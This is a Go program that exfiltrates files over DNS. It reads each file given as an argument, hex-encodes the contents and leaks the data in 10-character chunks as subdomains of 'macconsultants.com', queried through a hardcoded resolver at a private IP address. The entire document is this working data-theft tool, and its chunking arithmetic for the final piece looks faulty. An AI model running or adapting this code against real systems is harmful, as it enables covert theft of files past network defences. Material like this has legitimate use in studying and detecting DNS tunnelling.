package main

import (
        "net"
        "time"
        "context"
        "io/ioutil"
        "os"
        "fmt"
        "encoding/hex"
)

func main() {
  args := os.Args[1:]


  r := &net.Resolver{
    PreferGo: true,
    Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
      d := net.Dialer{
        Timeout: time.Millisecond * time.Duration(10000),
    }

    return d.DialContext(ctx, "udp", "172.16.143.128:53")
  },
  }

  for _,file := range args {

    if _,err := os.Stat(file); err == nil || os.IsExist(err){
      if data, er := ioutil.ReadFile(file); er == nil {
        fmt.Println("[+] Sending file " + file + " using hex encoding in the A record request...")
        plain := string(data)
        plain2 := []byte(plain)
        encoded := hex.EncodeToString(plain2)
        initializer := 0
        length := len(encoded)
        for {

          if initializer == 0{
            int1 := 10*initializer
            int2 := 10 + int1
            sendme := encoded[int1:int2]
            length -= 10
            initializer += 1
            dom := sendme + ".macconsultants.com"
            r.LookupHost(context.Background(),dom)
            //ipaddy, _ := r.LookupHost(context.Background(),dom)
            //fmt.Println(ipaddy[0])
            //fmt.Println(sendme)//append sendme as: sendmefinal.domain.com and send to the server
          } else {
            int3 := 10*initializer
            int4 := 10 + int3

            if (length < 10){
              //int5 := int3 + length
              sendmefinal := encoded[int3:(int4-(length+1))]
              mydom := sendmefinal + ".macconsultants.com"
              r.LookupHost(context.Background(),mydom)
              //ipaddy2, _ := r.LookupHost(context.Background(),mydom)
              fmt.Println("[+] File " + file + " successfully sent!")
              //fmt.Println(ipaddy2[0])
              //fmt.Println(sendmefinal)//append sendmefinal as: sendmefinal.domain.com and send to the server
              break
            }
            sendme2 := encoded[int3:int4]
            dom2 := sendme2 + ".macconsultants.com"
            r.LookupHost(context.Background(),dom2)
            //ipaddy3, _ := r.LookupHost(context.Background(),dom2)
            //fmt.Println(ipaddy3[0])
            length -= 10
            initializer += 1
            //fmt.Println(sendme2)//append sendme2 as: sendmefinal.domain.com and send to the server
          }


        }

      } else {
        fmt.Println("Error opening file " + file)
        os.Exit(1)
      }

    } else {
      fmt.Println("Input file " + file + " NOT found! Exiting...")
      os.Exit(1)
    }

  }

  // ip, _ := r.LookupHost(context.Background(),"testing.com")
  // ip2, _ := r.LookupHost(context.Background(),"testing1.com")
  // print(ip[0])
  // print("\n")
  // print(ip2[0])
  // print("\n")

}
